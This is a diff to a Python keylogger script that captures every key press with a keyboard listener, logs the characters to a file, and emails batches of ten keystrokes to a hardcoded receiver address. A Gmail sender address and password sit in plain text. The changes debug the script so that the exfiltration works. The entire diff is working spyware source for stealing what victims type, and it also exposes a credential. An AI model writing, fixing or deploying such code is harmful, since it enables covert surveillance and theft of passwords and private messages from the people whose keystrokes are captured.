@@ -7,16 +7,17 @@ emailer = "logger274@gmail.com"
 emailerPassword = "aaybvlfbvjdjafsv"
 receiver = "ariellewmaltese@gmail.com"
 
-subject = ('Key Logger')
-
+subject = 'Key Logger'
+body = " "
 
 def keyPressed(key):
-    print(str(key))
+    global body  # Declare 'body' as global
+
     with open("keyfile.txt", "a") as logKey:
         try:
             keyInput = key.char
             logKey.write(keyInput + "\n")
-        except:
+        except AttributeError:
             print('Error getting char')
 
     with open("keyfile.txt", "r") as logFile:
@@ -24,7 +25,8 @@ def keyPressed(key):
 
         if len(lines) >= 10:
             for i in range(10):
-                body = f"{body} {logFile.readLine(i)}"
+                body = f"{body} {lines[i].strip()}"  # Corrected line here
+
             em = EmailMessage()
             em['From'] = emailer
             em['To'] = receiver
@@ -43,9 +45,7 @@ def keyPressed(key):
         with open("keyfile.txt", "w") as logFile:
             logFile.writelines(lines)
 
-
 if __name__ == '__main__':
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
-
